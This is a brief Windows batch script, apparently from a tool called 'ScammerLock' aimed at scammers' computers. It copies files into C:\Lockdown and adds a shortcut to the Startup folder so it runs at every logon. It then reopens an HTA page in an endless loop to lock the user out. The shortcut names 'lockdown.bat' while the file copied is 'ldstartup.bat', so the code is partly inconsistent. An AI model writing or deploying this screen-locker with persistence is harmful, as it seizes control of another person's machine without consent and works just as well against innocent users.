@echo off
cls

if exist "C:\Lockdown" (
    del /S C:\Lockdown\*
    rmdir C:\Lockdown
)

mkdir C:\Lockdown
copy ldstartup.bat C:\Lockdown > nul
copy index.hta C:\Lockdown > nul
copy JBLogoUpscaled.png C:\Lockdown > nul
nircmd.exe shortcut "C:\Lockdown\lockdown.bat" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" "ScammerLock-HTA"

echo Initiating system lockdown...
echo Lockdown mode is now active.

:open
start "" /wait "index.hta"
goto :open

